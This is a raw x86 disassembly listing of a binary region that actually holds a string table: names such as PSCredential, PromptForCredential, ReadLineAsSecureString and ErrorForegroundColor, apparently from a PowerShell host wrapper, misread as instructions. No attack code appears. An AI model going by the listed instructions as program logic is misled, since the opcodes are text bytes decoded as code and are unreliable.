  4071a4:	4f                   	dec    %edi
  4071a5:	54                   	push   %esp
  4071a6:	45                   	inc    %ebp
  4071a7:	00 53 54             	add    %dl,0x54(%ebx)
  4071aa:	44                   	inc    %esp
  4071ab:	5f                   	pop    %edi
  4071ac:	49                   	dec    %ecx
  4071ad:	4e                   	dec    %esi
  4071ae:	50                   	push   %eax
  4071af:	55                   	push   %ebp
  4071b0:	54                   	push   %esp
  4071b1:	5f                   	pop    %edi
  4071b2:	48                   	dec    %eax
  4071b3:	41                   	inc    %ecx
  4071b4:	4e                   	dec    %esi
  4071b5:	44                   	inc    %esp
  4071b6:	4c                   	dec    %esp
  4071b7:	45                   	inc    %ebp
  4071b8:	00 53 54             	add    %dl,0x54(%ebx)
  4071bb:	44                   	inc    %esp
  4071bc:	5f                   	pop    %edi
  4071bd:	4f                   	dec    %edi
  4071be:	55                   	push   %ebp
  4071bf:	54                   	push   %esp
  4071c0:	50                   	push   %eax
  4071c1:	55                   	push   %ebp
  4071c2:	54                   	push   %esp
  4071c3:	5f                   	pop    %edi
  4071c4:	48                   	dec    %eax
  4071c5:	41                   	inc    %ecx
  4071c6:	4e                   	dec    %esi
  4071c7:	44                   	inc    %esp
  4071c8:	4c                   	dec    %esp
  4071c9:	45                   	inc    %ebp
  4071ca:	00 53 54             	add    %dl,0x54(%ebx)
  4071cd:	44                   	inc    %esp
  4071ce:	5f                   	pop    %edi
  4071cf:	45                   	inc    %ebp
  4071d0:	52                   	push   %edx
  4071d1:	52                   	push   %edx
  4071d2:	4f                   	dec    %edi
  4071d3:	52                   	push   %edx
  4071d4:	5f                   	pop    %edi
  4071d5:	48                   	dec    %eax
  4071d6:	41                   	inc    %ecx
  4071d7:	4e                   	dec    %esi
  4071d8:	44                   	inc    %esp
  4071d9:	4c                   	dec    %esp
  4071da:	45                   	inc    %ebp
  4071db:	00 72 61             	add    %dh,0x61(%edx)
  4071de:	77 55                	ja     0x407235
  4071e0:	49                   	dec    %ecx
  4071e1:	00 45 72             	add    %al,0x72(%ebp)
  4071e4:	72 6f                	jb     0x407255
  4071e6:	72 46                	jb     0x40722e
  4071e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4071e9:	72 65                	jb     0x407250
  4071eb:	67 72 6f             	addr16 jb 0x40725d
  4071ee:	75 6e                	jne    0x40725e
  4071f0:	64 43                	fs inc %ebx
  4071f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4071f3:	6c                   	insb   (%dx),%es:(%edi)
  4071f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4071f5:	72 00                	jb     0x4071f7
  4071f7:	45                   	inc    %ebp
  4071f8:	72 72                	jb     0x40726c
  4071fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4071fb:	72 42                	jb     0x40723f
  4071fd:	61                   	popa
  4071fe:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407201:	72 6f                	jb     0x407272
  407203:	75 6e                	jne    0x407273
  407205:	64 43                	fs inc %ebx
  407207:	6f                   	outsl  %ds:(%esi),(%dx)
  407208:	6c                   	insb   (%dx),%es:(%edi)
  407209:	6f                   	outsl  %ds:(%esi),(%dx)
  40720a:	72 00                	jb     0x40720c
  40720c:	57                   	push   %edi
  40720d:	61                   	popa
  40720e:	72 6e                	jb     0x40727e
  407210:	69 6e 67 46 6f 72 65 	imul   $0x65726f46,0x67(%esi),%ebp
  407217:	67 72 6f             	addr16 jb 0x407289
  40721a:	75 6e                	jne    0x40728a
  40721c:	64 43                	fs inc %ebx
  40721e:	6f                   	outsl  %ds:(%esi),(%dx)
  40721f:	6c                   	insb   (%dx),%es:(%edi)
  407220:	6f                   	outsl  %ds:(%esi),(%dx)
  407221:	72 00                	jb     0x407223
  407223:	57                   	push   %edi
  407224:	61                   	popa
  407225:	72 6e                	jb     0x407295
  407227:	69 6e 67 42 61 63 6b 	imul   $0x6b636142,0x67(%esi),%ebp
  40722e:	67 72 6f             	addr16 jb 0x4072a0
  407231:	75 6e                	jne    0x4072a1
  407233:	64 43                	fs inc %ebx
  407235:	6f                   	outsl  %ds:(%esi),(%dx)
  407236:	6c                   	insb   (%dx),%es:(%edi)
  407237:	6f                   	outsl  %ds:(%esi),(%dx)
  407238:	72 00                	jb     0x40723a
  40723a:	44                   	inc    %esp
  40723b:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40723f:	46                   	inc    %esi
  407240:	6f                   	outsl  %ds:(%esi),(%dx)
  407241:	72 65                	jb     0x4072a8
  407243:	67 72 6f             	addr16 jb 0x4072b5
  407246:	75 6e                	jne    0x4072b6
  407248:	64 43                	fs inc %ebx
  40724a:	6f                   	outsl  %ds:(%esi),(%dx)
  40724b:	6c                   	insb   (%dx),%es:(%edi)
  40724c:	6f                   	outsl  %ds:(%esi),(%dx)
  40724d:	72 00                	jb     0x40724f
  40724f:	44                   	inc    %esp
  407250:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407254:	42                   	inc    %edx
  407255:	61                   	popa
  407256:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407259:	72 6f                	jb     0x4072ca
  40725b:	75 6e                	jne    0x4072cb
  40725d:	64 43                	fs inc %ebx
  40725f:	6f                   	outsl  %ds:(%esi),(%dx)
  407260:	6c                   	insb   (%dx),%es:(%edi)
  407261:	6f                   	outsl  %ds:(%esi),(%dx)
  407262:	72 00                	jb     0x407264
  407264:	56                   	push   %esi
  407265:	65 72 62             	gs jb  0x4072ca
  407268:	6f                   	outsl  %ds:(%esi),(%dx)
  407269:	73 65                	jae    0x4072d0
  40726b:	46                   	inc    %esi
  40726c:	6f                   	outsl  %ds:(%esi),(%dx)
  40726d:	72 65                	jb     0x4072d4
  40726f:	67 72 6f             	addr16 jb 0x4072e1
  407272:	75 6e                	jne    0x4072e2
  407274:	64 43                	fs inc %ebx
  407276:	6f                   	outsl  %ds:(%esi),(%dx)
  407277:	6c                   	insb   (%dx),%es:(%edi)
  407278:	6f                   	outsl  %ds:(%esi),(%dx)
  407279:	72 00                	jb     0x40727b
  40727b:	56                   	push   %esi
  40727c:	65 72 62             	gs jb  0x4072e1
  40727f:	6f                   	outsl  %ds:(%esi),(%dx)
  407280:	73 65                	jae    0x4072e7
  407282:	42                   	inc    %edx
  407283:	61                   	popa
  407284:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407287:	72 6f                	jb     0x4072f8
  407289:	75 6e                	jne    0x4072f9
  40728b:	64 43                	fs inc %ebx
  40728d:	6f                   	outsl  %ds:(%esi),(%dx)
  40728e:	6c                   	insb   (%dx),%es:(%edi)
  40728f:	6f                   	outsl  %ds:(%esi),(%dx)
  407290:	72 00                	jb     0x407292
  407292:	50                   	push   %eax
  407293:	72 6f                	jb     0x407304
  407295:	67 72 65             	addr16 jb 0x4072fd
  407298:	73 73                	jae    0x40730d
  40729a:	46                   	inc    %esi
  40729b:	6f                   	outsl  %ds:(%esi),(%dx)
  40729c:	72 65                	jb     0x407303
  40729e:	67 72 6f             	addr16 jb 0x407310
  4072a1:	75 6e                	jne    0x407311
  4072a3:	64 43                	fs inc %ebx
  4072a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4072a6:	6c                   	insb   (%dx),%es:(%edi)
  4072a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4072a8:	72 00                	jb     0x4072aa
  4072aa:	50                   	push   %eax
  4072ab:	72 6f                	jb     0x40731c
  4072ad:	67 72 65             	addr16 jb 0x407315
  4072b0:	73 73                	jae    0x407325
  4072b2:	42                   	inc    %edx
  4072b3:	61                   	popa
  4072b4:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  4072b7:	72 6f                	jb     0x407328
  4072b9:	75 6e                	jne    0x407329
  4072bb:	64 43                	fs inc %ebx
  4072bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4072be:	6c                   	insb   (%dx),%es:(%edi)
  4072bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4072c0:	72 00                	jb     0x4072c2
  4072c2:	44                   	inc    %esp
  4072c3:	69 63 74 69 6f 6e 61 	imul   $0x616e6f69,0x74(%ebx),%esp
  4072ca:	72 79                	jb     0x407345
  4072cc:	60                   	pusha
  4072cd:	32 00                	xor    (%eax),%al
  4072cf:	50                   	push   %eax
  4072d0:	53                   	push   %ebx
  4072d1:	4f                   	dec    %edi
  4072d2:	62 6a 65             	bound  %ebp,0x65(%edx)
  4072d5:	63 74 00 46          	arpl   %esi,0x46(%eax,%eax,1)
  4072d9:	69 65 6c 64 44 65 73 	imul   $0x73654464,0x6c(%ebp),%esp
  4072e0:	63 72 69             	arpl   %esi,0x69(%edx)
  4072e3:	70 74                	jo     0x407359
  4072e5:	69 6f 6e 00 50 72 6f 	imul   $0x6f725000,0x6e(%edi),%ebp
  4072ec:	6d                   	insl   (%dx),%es:(%edi)
  4072ed:	70 74                	jo     0x407363
  4072ef:	00 50 72             	add    %dl,0x72(%eax)
  4072f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4072f3:	6d                   	insl   (%dx),%es:(%edi)
  4072f4:	70 74                	jo     0x40736a
  4072f6:	46                   	inc    %esi
  4072f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4072f8:	72 43                	jb     0x40733d
  4072fa:	68 6f 69 63 65       	push   $0x6563696f
  4072ff:	00 50 53             	add    %dl,0x53(%eax)
  407302:	43                   	inc    %ebx
  407303:	72 65                	jb     0x40736a
  407305:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  407308:	74 69                	je     0x407373
  40730a:	61                   	popa
  40730b:	6c                   	insb   (%dx),%es:(%edi)
  40730c:	00 50 72             	add    %dl,0x72(%eax)
  40730f:	6f                   	outsl  %ds:(%esi),(%dx)
  407310:	6d                   	insl   (%dx),%es:(%edi)
  407311:	70 74                	jo     0x407387
  407313:	46                   	inc    %esi
  407314:	6f                   	outsl  %ds:(%esi),(%dx)
  407315:	72 43                	jb     0x40735a
  407317:	72 65                	jb     0x40737e
  407319:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  40731c:	74 69                	je     0x407387
  40731e:	61                   	popa
  40731f:	6c                   	insb   (%dx),%es:(%edi)
  407320:	00 67 65             	add    %ah,0x65(%edi)
  407323:	74 5f                	je     0x407384
  407325:	52                   	push   %edx
  407326:	61                   	popa
  407327:	77 55                	ja     0x40737e
  407329:	49                   	dec    %ecx
  40732a:	00 69 62             	add    %ch,0x62(%ecx)
  40732d:	5f                   	pop    %edi
  40732e:	63 61 70             	arpl   %esp,0x70(%ecx)
  407331:	74 69                	je     0x40739c
  407333:	6f                   	outsl  %ds:(%esi),(%dx)
  407334:	6e                   	outsb  %ds:(%esi),(%dx)
  407335:	00 69 62             	add    %ch,0x62(%ecx)
  407338:	5f                   	pop    %edi
  407339:	6d                   	insl   (%dx),%es:(%edi)
  40733a:	65 73 73             	gs jae 0x4073b0
  40733d:	61                   	popa
  40733e:	67 65 00 52 65       	add    %dl,%gs:0x65(%bp,%si)
  407343:	61                   	popa
  407344:	64 4c                	fs dec %esp
  407346:	69 6e 65 00 53 79 73 	imul   $0x73795300,0x65(%esi),%ebp
  40734d:	74 65                	je     0x4073b4
  40734f:	6d                   	insl   (%dx),%es:(%edi)
  407350:	2e 53                	cs push %ebx
  407352:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  407356:	69 74 79 00 53 65 63 	imul   $0x75636553,0x0(%ecx,%edi,2),%esi
  40735d:	75 
  40735e:	72 65                	jb     0x4073c5
  407360:	53                   	push   %ebx
  407361:	74 72                	je     0x4073d5
  407363:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  40736a:	50                   	push   %eax
  40736b:	61                   	popa
  40736c:	73 73                	jae    0x4073e1
  40736e:	77 6f                	ja     0x4073df
  407370:	72 64                	jb     0x4073d6
  407372:	00 52 65             	add    %dl,0x65(%edx)
  407375:	61                   	popa
  407376:	64 4c                	fs dec %esp
  407378:	69 6e 65 41 73 53 65 	imul   $0x65537341,0x65(%esi),%ebp
  40737f:	63 75 72             	arpl   %esi,0x72(%ebp)
  407382:	65 53                	gs push %ebx
  407384:	74 72                	je     0x4073f8
  407386:	69 6e 67 00 57 72 69 	imul   $0x69725700,0x67(%esi),%ebp
  40738d:	74 65                	je     0x4073f4
  40738f:	00 57 72             	add    %dl,0x72(%edi)
  407392:	69 74 65 44 65 62 75 	imul   $0x67756265,0x44(%ebp,%eiz,2),%esi
  407399:	67 
  40739a:	4c                   	dec    %esp
  40739b:	69 6e 65 00 57 72 69 	imul   $0x69725700,0x65(%esi),%ebp
  4073a2:	74 65                	je     0x407409
  4073a4:	45                   	inc    %ebp
  4073a5:	72 72                	jb     0x407419
  4073a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4073a8:	72 4c                	jb     0x4073f6
  4073aa:	69 6e 65 00 57 72 69 	imul   $0x69725700,0x65(%esi),%ebp
  4073b1:	74 65                	je     0x407418
  4073b3:	4c                   	dec    %esp
  4073b4:	69 6e 65 00 70 66 00 	imul   $0x667000,0x65(%esi),%ebp
  4073bb:	57                   	push   %edi
  4073bc:	72 69                	jb     0x407427
  4073be:	74 65                	je     0x407425
  4073c0:	50                   	push   %eax
  4073c1:	72 6f                	jb     0x407432
  4073c3:	67 72 65             	addr16 jb 0x40742b
  4073c6:	73 73                	jae    0x40743b
  4073c8:	00 57 72             	add    %dl,0x72(%edi)
  4073cb:	69 74 65 56 65 72 62 	imul   $0x6f627265,0x56(%ebp,%eiz,2),%esi
  4073d2:	6f 
  4073d3:	73 65                	jae    0x40743a
  4073d5:	4c                   	dec    %esp
  4073d6:	69 6e 65 00 57 72 69 	imul   $0x69725700,0x65(%esi),%ebp
  4073dd:	74 65                	je     0x407444
  4073df:	57                   	push   %edi
  4073e0:	61                   	popa
  4073e1:	72 6e                	jb     0x407451
  4073e3:	69 6e 67 4c 69 6e 65 	imul   $0x656e694c,0x67(%esi),%ebp
  4073ea:	00 52 61             	add    %dl,0x61(%edx)
  4073ed:	77 55                	ja     0x407444
  4073ef:	49                   	dec    %ecx
  4073f0:	00 70 61             	add    %dh,0x61(%eax)
  4073f3:	72 65                	jb     0x40745a
  4073f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4073f6:	74 00                	je     0x4073f8
  4073f8:	75 69                	jne    0x407463
  4073fa:	00 53 79             	add    %dl,0x79(%ebx)
  4073fd:	73 74                	jae    0x407473
  4073ff:	65 6d                	gs insl (%dx),%es:(%edi)
  407401:	2e 47                	cs inc %edi
  407403:	6c                   	insb   (%dx),%es:(%edi)
  407404:	6f                   	outsl  %ds:(%esi),(%dx)
  407405:	62 61 6c             	bound  %esp,0x6c(%ecx)
  407408:	69 7a 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%edx),%edi
  40740f:	00 43 75             	add    %al,0x75(%ebx)
  407412:	6c                   	insb   (%dx),%es:(%edi)
  407413:	74 75                	je     0x40748a
  407415:	72 65                	jb     0x40747c
  407417:	49                   	dec    %ecx
  407418:	6e                   	outsb  %ds:(%esi),(%dx)
  407419:	66 6f                	outsw  %ds:(%esi),(%dx)
  40741b:	00 6f 72             	add    %ch,0x72(%edi)
  40741e:	69 67 69 6e 61 6c 43 	imul   $0x436c616e,0x69(%edi),%esp
  407425:	75 6c                	jne    0x407493
  407427:	74 75                	je     0x40749e
  407429:	72 65                	jb     0x407490
  40742b:	49                   	dec    %ecx
  40742c:	6e                   	outsb  %ds:(%esi),(%dx)
  40742d:	66 6f                	outsw  %ds:(%esi),(%dx)
  40742f:	00 6f 72             	add    %ch,0x72(%edi)
  407432:	69 67 69 6e 61 6c 55 	imul   $0x556c616e,0x69(%edi),%esp
  407439:	49                   	dec    %ecx
  40743a:	43                   	inc    %ebx
  40743b:	75 6c                	jne    0x4074a9
  40743d:	74 75                	je     0x4074b4
  40743f:	72 65                	jb     0x4074a6
  407441:	49                   	dec    %ecx
  407442:	6e                   	outsb  %ds:(%esi),(%dx)
  407443:	66 6f                	outsw  %ds:(%esi),(%dx)
  407445:	00 47 75             	add    %al,0x75(%edi)
  407448:	69 64 00 6d 79 49 64 	imul   $0x644979,0x6d(%eax,%eax,1),%esp
  40744f:	00 
  407450:	67 65 74 5f          	addr16 gs je 0x4074b3
  407454:	50                   	push   %eax
  407455:	72 69                	jb     0x4074c0
  407457:	76 61                	jbe    0x4074ba
  407459:	74 65                	je     0x4074c0
  40745b:	44                   	inc    %esp
  40745c:	61                   	popa
  40745d:	74 61                	je     0x4074c0
  40745f:	00 5f 63             	add    %bl,0x63(%edi)
  407462:	6f                   	outsl  %ds:(%esi),(%dx)
  407463:	6e                   	outsb  %ds:(%esi),(%dx)
  407464:	73 6f                	jae    0x4074d5
  407466:	6c                   	insb   (%dx),%es:(%edi)
  407467:	65 43                	gs inc %ebx
  407469:	6f                   	outsl  %ds:(%esi),(%dx)
  40746a:	6c                   	insb   (%dx),%es:(%edi)
  40746b:	6f                   	outsl  %ds:(%esi),(%dx)
  40746c:	72 50                	jb     0x4074be
  40746e:	72 6f                	jb     0x4074df
  407470:	78 79                	js     0x4074eb
  407472:	00 67 65             	add    %ah,0x65(%edi)
  407475:	74 5f                	je     0x4074d6
  407477:	43                   	inc    %ebx
  407478:	75 72                	jne    0x4074ec
  40747a:	72 65                	jb     0x4074e1
  40747c:	6e                   	outsb  %ds:(%esi),(%dx)
  40747d:	74 43                	je     0x4074c2
  40747f:	75 6c                	jne    0x4074ed
  407481:	74 75                	je     0x4074f8
  407483:	72 65                	jb     0x4074ea
  407485:	00 67 65             	add    %ah,0x65(%edi)
  407488:	74 5f                	je     0x4074e9
  40748a:	43                   	inc    %ebx
  40748b:	75 72                	jne    0x4074ff
  40748d:	72 65                	jb     0x4074f4
  40748f:	6e                   	outsb  %ds:(%esi),(%dx)
  407490:	74 55                	je     0x4074e7
  407492:	49                   	dec    %ecx
  407493:	43                   	inc    %ebx
  407494:	75 6c                	jne    0x407502
  407496:	74 75                	je     0x40750d
  407498:	72 65                	jb     0x4074ff
  40749a:	00 67 65             	add    %ah,0x65(%edi)
  40749d:	74 5f                	je     0x4074fe
  40749f:	49                   	dec    %ecx
  4074a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4074a1:	73 74                	jae    0x407517
  4074a3:	61                   	popa
  4074a4:	6e                   	outsb  %ds:(%esi),(%dx)
  4074a5:	63 65 49             	arpl   %esp,0x49(%ebp)
  4074a8:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  4074ac:	74 5f                	je     0x40750d
  4074ae:	4e                   	dec    %esi
  4074af:	61                   	popa
  4074b0:	6d                   	insl   (%dx),%es:(%edi)
  4074b1:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4074b5:	74 5f                	je     0x407516
  4074b7:	55                   	push   %ebp
  4074b8:	49                   	dec    %ecx
  4074b9:	00 56 65             	add    %dl,0x65(%esi)
  4074bc:	72 73                	jb     0x407531
  4074be:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  4074c5:	5f                   	pop    %edi
  4074c6:	56                   	push   %esi
  4074c7:	65 72 73             	gs jb  0x40753d
  4074ca:	69 6f 6e 00 45 6e 74 	imul   $0x746e4500,0x6e(%edi),%ebp
  4074d1:	65 72 4e             	gs jb  0x407522
  4074d4:	65 73 74             	gs jae 0x40754b
  4074d7:	65 64 50             	gs fs push %eax
  4074da:	72 6f                	jb     0x40754b
  4074dc:	6d                   	insl   (%dx),%es:(%edi)
  4074dd:	70 74                	jo     0x407553
  4074df:	00 45 78             	add    %al,0x78(%ebp)
  4074e2:	69 74 4e 65 73 74 65 	imul   $0x64657473,0x65(%esi,%ecx,2),%esi
  4074e9:	64 
  4074ea:	50                   	push   %eax
  4074eb:	72 6f                	jb     0x40755c
  4074ed:	6d                   	insl   (%dx),%es:(%edi)
  4074ee:	70 74                	jo     0x407564
  4074f0:	00 4e 6f             	add    %cl,0x6f(%esi)
  4074f3:	74 69                	je     0x40755e
  4074f5:	66 79 42             	data16 jns 0x40753a
  4074f8:	65 67 69 6e 41 70 70 	imul   $0x696c7070,%gs:0x41(%bp),%ebp
  4074ff:	6c 69 
  407501:	63 61 74             	arpl   %esp,0x74(%ecx)
  407504:	69 6f 6e 00 4e 6f 74 	imul   $0x746f4e00,0x6e(%edi),%ebp
  40750b:	69 66 79 45 6e 64 41 	imul   $0x41646e45,0x79(%esi),%esp
  407512:	70 70                	jo     0x407584
  407514:	6c                   	insb   (%dx),%es:(%edi)
  407515:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  40751c:	00 53 65             	add    %dl,0x65(%ebx)
  40751f:	74 53                	je     0x407574
  407521:	68 6f 75 6c 64       	push   $0x646c756f
  407526:	45                   	inc    %ebp
  407527:	78 69                	js     0x407592
  407529:	74 00                	je     0x40752b
  40752b:	50                   	push   %eax
  40752c:	72 69                	jb     0x407597
  40752e:	76 61                	jbe    0x407591
  407530:	74 65                	je     0x407597
  407532:	44                   	inc    %esp
  407533:	61                   	popa
  407534:	74 61                	je     0x407597
  407536:	00 43 75             	add    %al,0x75(%ebx)
  407539:	72 72                	jb     0x4075ad
  40753b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40753d:	74 43                	je     0x407582
  40753f:	75 6c                	jne    0x4075ad
  407541:	74 75                	je     0x4075b8
  407543:	72 65                	jb     0x4075aa
  407545:	00 43 75             	add    %al,0x75(%ebx)
  407548:	72 72                	jb     0x4075bc
  40754a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40754c:	74 55                	je     0x4075a3
  40754e:	49                   	dec    %ecx
  40754f:	43                   	inc    %ebx
  407550:	75 6c                	jne    0x4075be
  407552:	74 75                	je     0x4075c9
  407554:	72 65                	jb     0x4075bb
  407556:	00 49 6e             	add    %cl,0x6e(%ecx)
  407559:	73 74                	jae    0x4075cf
  40755b:	61                   	popa
  40755c:	6e                   	outsb  %ds:(%esi),(%dx)
  40755d:	63 65 49             	arpl   %esp,0x49(%ebp)
  407560:	64 00 4e 61          	add    %cl,%fs:0x61(%esi)
  407564:	6d                   	insl   (%dx),%es:(%edi)
  407565:	65 00 55 49          	add    %dl,%gs:0x49(%ebp)
  407569:	00 5f 75             	add    %bl,0x75(%edi)
  40756c:	69 00 67 65 74 5f    	imul   $0x5f746567,(%eax),%eax
  407572:	45                   	inc    %ebp
  407573:	72 72                	jb     0x4075e7
  407575:	6f                   	outsl  %ds:(%esi),(%dx)
  407576:	72 46                	jb     0x4075be
  407578:	6f                   	outsl  %ds:(%esi),(%dx)
  407579:	72 65                	jb     0x4075e0
  40757b:	67 72 6f             	addr16 jb 0x4075ed
  40757e:	75 6e                	jne    0x4075ee
  407580:	64 43                	fs inc %ebx
  407582:	6f                   	outsl  %ds:(%esi),(%dx)
  407583:	6c                   	insb   (%dx),%es:(%edi)
  407584:	6f                   	outsl  %ds:(%esi),(%dx)
  407585:	72 00                	jb     0x407587
  407587:	73 65                	jae    0x4075ee
  407589:	74 5f                	je     0x4075ea
  40758b:	45                   	inc    %ebp
  40758c:	72 72                	jb     0x407600
  40758e:	6f                   	outsl  %ds:(%esi),(%dx)
  40758f:	72 46                	jb     0x4075d7
  407591:	6f                   	outsl  %ds:(%esi),(%dx)
  407592:	72 65                	jb     0x4075f9
  407594:	67 72 6f             	addr16 jb 0x407606
  407597:	75 6e                	jne    0x407607
  407599:	64 43                	fs inc %ebx
  40759b:	6f                   	outsl  %ds:(%esi),(%dx)
  40759c:	6c                   	insb   (%dx),%es:(%edi)
  40759d:	6f                   	outsl  %ds:(%esi),(%dx)
  40759e:	72 00                	jb     0x4075a0
  4075a0:	67 65 74 5f          	addr16 gs je 0x407603
  4075a4:	45                   	inc    %ebp
  4075a5:	72 72                	jb     0x407619
  4075a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4075a8:	72 42                	jb     0x4075ec
  4075aa:	61                   	popa
  4075ab:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  4075ae:	72 6f                	jb     0x40761f
  4075b0:	75 6e                	jne    0x407620
  4075b2:	64 43                	fs inc %ebx
  4075b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4075b5:	6c                   	insb   (%dx),%es:(%edi)
  4075b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4075b7:	72 00                	jb     0x4075b9
  4075b9:	73 65                	jae    0x407620
  4075bb:	74 5f                	je     0x40761c
  4075bd:	45                   	inc    %ebp
  4075be:	72 72                	jb     0x407632
  4075c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4075c1:	72 42                	jb     0x407605
  4075c3:	61                   	popa
  4075c4:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  4075c7:	72 6f                	jb     0x407638
  4075c9:	75 6e                	jne    0x407639
  4075cb:	64 43                	fs inc %ebx
  4075cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4075ce:	6c                   	insb   (%dx),%es:(%edi)
  4075cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4075d0:	72 00                	jb     0x4075d2
  4075d2:	67 65 74 5f          	addr16 gs je 0x407635
  4075d6:	57                   	push   %edi
  4075d7:	61                   	popa
  4075d8:	72 6e                	jb     0x407648
  4075da:	69 6e 67 46 6f 72 65 	imul   $0x65726f46,0x67(%esi),%ebp
  4075e1:	67 72 6f             	addr16 jb 0x407653
  4075e4:	75 6e                	jne    0x407654
  4075e6:	64 43                	fs inc %ebx
  4075e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4075e9:	6c                   	insb   (%dx),%es:(%edi)
  4075ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4075eb:	72 00                	jb     0x4075ed
  4075ed:	73 65                	jae    0x407654
  4075ef:	74 5f                	je     0x407650
  4075f1:	57                   	push   %edi
  4075f2:	61                   	popa
  4075f3:	72 6e                	jb     0x407663
  4075f5:	69 6e 67 46 6f 72 65 	imul   $0x65726f46,0x67(%esi),%ebp
  4075fc:	67 72 6f             	addr16 jb 0x40766e
  4075ff:	75 6e                	jne    0x40766f
  407601:	64 43                	fs inc %ebx
  407603:	6f                   	outsl  %ds:(%esi),(%dx)
  407604:	6c                   	insb   (%dx),%es:(%edi)
  407605:	6f                   	outsl  %ds:(%esi),(%dx)
  407606:	72 00                	jb     0x407608
  407608:	67 65 74 5f          	addr16 gs je 0x40766b
  40760c:	57                   	push   %edi
  40760d:	61                   	popa
  40760e:	72 6e                	jb     0x40767e
  407610:	69 6e 67 42 61 63 6b 	imul   $0x6b636142,0x67(%esi),%ebp
  407617:	67 72 6f             	addr16 jb 0x407689
  40761a:	75 6e                	jne    0x40768a
  40761c:	64 43                	fs inc %ebx
  40761e:	6f                   	outsl  %ds:(%esi),(%dx)
  40761f:	6c                   	insb   (%dx),%es:(%edi)
  407620:	6f                   	outsl  %ds:(%esi),(%dx)
  407621:	72 00                	jb     0x407623
  407623:	73 65                	jae    0x40768a
  407625:	74 5f                	je     0x407686
  407627:	57                   	push   %edi
  407628:	61                   	popa
  407629:	72 6e                	jb     0x407699
  40762b:	69 6e 67 42 61 63 6b 	imul   $0x6b636142,0x67(%esi),%ebp
  407632:	67 72 6f             	addr16 jb 0x4076a4
  407635:	75 6e                	jne    0x4076a5
  407637:	64 43                	fs inc %ebx
  407639:	6f                   	outsl  %ds:(%esi),(%dx)
  40763a:	6c                   	insb   (%dx),%es:(%edi)
  40763b:	6f                   	outsl  %ds:(%esi),(%dx)
  40763c:	72 00                	jb     0x40763e
  40763e:	67 65 74 5f          	addr16 gs je 0x4076a1
  407642:	44                   	inc    %esp
  407643:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407647:	46                   	inc    %esi
  407648:	6f                   	outsl  %ds:(%esi),(%dx)
  407649:	72 65                	jb     0x4076b0
  40764b:	67 72 6f             	addr16 jb 0x4076bd
  40764e:	75 6e                	jne    0x4076be
  407650:	64 43                	fs inc %ebx
  407652:	6f                   	outsl  %ds:(%esi),(%dx)
  407653:	6c                   	insb   (%dx),%es:(%edi)
  407654:	6f                   	outsl  %ds:(%esi),(%dx)
  407655:	72 00                	jb     0x407657
  407657:	73 65                	jae    0x4076be
  407659:	74 5f                	je     0x4076ba
  40765b:	44                   	inc    %esp
  40765c:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407660:	46                   	inc    %esi
  407661:	6f                   	outsl  %ds:(%esi),(%dx)
  407662:	72 65                	jb     0x4076c9
  407664:	67 72 6f             	addr16 jb 0x4076d6
  407667:	75 6e                	jne    0x4076d7
  407669:	64 43                	fs inc %ebx
  40766b:	6f                   	outsl  %ds:(%esi),(%dx)
  40766c:	6c                   	insb   (%dx),%es:(%edi)
  40766d:	6f                   	outsl  %ds:(%esi),(%dx)
  40766e:	72 00                	jb     0x407670
  407670:	67 65 74 5f          	addr16 gs je 0x4076d3
  407674:	44                   	inc    %esp
  407675:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407679:	42                   	inc    %edx
  40767a:	61                   	popa
  40767b:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  40767e:	72 6f                	jb     0x4076ef
  407680:	75 6e                	jne    0x4076f0
  407682:	64 43                	fs inc %ebx
  407684:	6f                   	outsl  %ds:(%esi),(%dx)
  407685:	6c                   	insb   (%dx),%es:(%edi)
  407686:	6f                   	outsl  %ds:(%esi),(%dx)
  407687:	72 00                	jb     0x407689
  407689:	73 65                	jae    0x4076f0
  40768b:	74 5f                	je     0x4076ec
  40768d:	44                   	inc    %esp
  40768e:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407692:	42                   	inc    %edx
  407693:	61                   	popa
  407694:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407697:	72 6f                	jb     0x407708
  407699:	75 6e                	jne    0x407709
  40769b:	64 43                	fs inc %ebx
